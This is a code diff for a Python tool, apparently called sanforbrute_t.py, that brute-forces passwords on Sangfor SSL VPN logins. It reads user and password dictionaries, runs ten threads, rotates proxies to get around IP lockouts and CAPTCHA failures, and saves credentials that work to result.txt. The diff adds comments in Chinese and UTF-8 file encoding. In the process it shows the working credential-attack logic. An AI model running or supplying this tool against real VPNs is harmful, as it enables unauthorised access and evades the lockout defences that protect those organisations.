@@ -58,11 +58,11 @@ def exploit(user,dic):
 
 			elif len(verify) == 31:
 				print(user,dic+" :IP locked")
-				r = exploit(user,dic)
+				r = exploit(user,dic)	#IP锁了就换一个代理递归重试一次
 				return r
 			else:
 				print(user,dic+" :SOMETHING wrong")
-				r = exploit(user,dic)
+				r = exploit(user,dic)	#可能是验证码过期或是出现验证码的情况，递归重试
 				return r
 		else:
 		 	print(user,dic+" :RESPONSE error")
@@ -74,7 +74,6 @@ def exploit(user,dic):
 		print(user,dic+" :Proxy error")
 		#if _FINISH == False:
 		try:
-
 			requests.get("http://{}:5010/delete/?proxy={}".format(proxyapi,proxy)) #代理失效从地址池删除掉
 			r = exploit(user,dic)
 			return r
@@ -96,7 +95,7 @@ def brute(i,user,pass_queue):
 			if result == "wrong":			
 				pass
 			else:
-				with open('result.txt','a+') as f:
+				with open('result.txt','a+',encoding='utf-8') as f:
 					f.write(result[0]+" : "+result[1] + "\r\n")
 				pass_queue.queue.clear()
 				break
@@ -115,10 +114,10 @@ python sanforbrute_t.py https://sslvpn地址 user.txt pass.txt 127.0.0.1
 
 	n = 10 # threading 数量
 	mythread = []
-	with open(userdic,'r') as users:  #用户字典
+	with open(userdic,'r',encoding='utf-8') as users:  #用户字典
 		for user in users:
 			pass_queue = queue.Queue()
-			with open(passdic,'r') as pwds: #密码字典
+			with open(passdic,'r',encoding='utf-8') as pwds: #密码字典
 
 				for pwd in pwds:
 					pass_queue.put(pwd)
